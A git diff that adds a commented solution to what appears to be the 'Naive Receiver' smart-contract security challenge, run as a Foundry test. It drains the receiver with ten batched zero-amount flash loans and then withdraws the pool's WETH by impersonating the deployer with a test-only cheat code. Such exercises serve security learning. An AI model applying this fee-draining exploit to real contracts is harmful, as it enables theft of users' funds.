@@ -77,8 +77,40 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+    
+        //NOTE (tina):Step 1:create encoded data to drain the receiver's balance using multicall
+        //the pool takes 1 fee per time so we have to call 10 times
+        bytes[] memory data = new bytes[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            data[i] = abi.encodeWithSignature(
+                "flashLoan(address,address,uint256,bytes)",
+                address(receiver), //putting receiver as the borrower so it can takes fees from receiver
+                address(weth),
+                0, //flashLoan function doesn't check 0 amount
+                ""
+            );
+        }
+       
+        //Call multicall on the pool
+        pool.multicall(data);
+
+        //Step 2:now that we have drained the receiver, next step is to drain the pool and move all funds to 'recovery'
+        //we do this by impersonating 'deployer' and calling 'withdraw' on the pool. why do we impersonate deployer?
+        //because in the pool's withdraw function, the first logic say 'deposits[_msgSender()] -= amount'
+        //This means everytime someone calls 'withdraw', it subtracts 'amount' from msg.sender's 'deposits'
+        //so the person who can call 'withdraw' is someone who already has some 'deposits', otherwise it wiil causes underflow(0 -'amount')
+        //if you look at the pool's contract, this line in flashLoan function 'deposits[feeReceiver] += FIXED_FEE' tells us that the person is 'feeReceiver'
+        //and in the test's check pool's config, this line 'assertEq(pool.feeReceiver(), deployer)' tells us that 'feeReceiver=deployer'
+        //and since 'deployer' is a 'makeAddr', we can impersonate it and call 'withdraw' successfully
+        vm.startPrank(address(deployer));
+        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
+        vm.stopPrank();
+       
+       //this is why the exploit works: anyone can force the receiver to pay fees, and only the feeReceiver can withdraw the accumulated WETH
     }
+
+        
+    
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
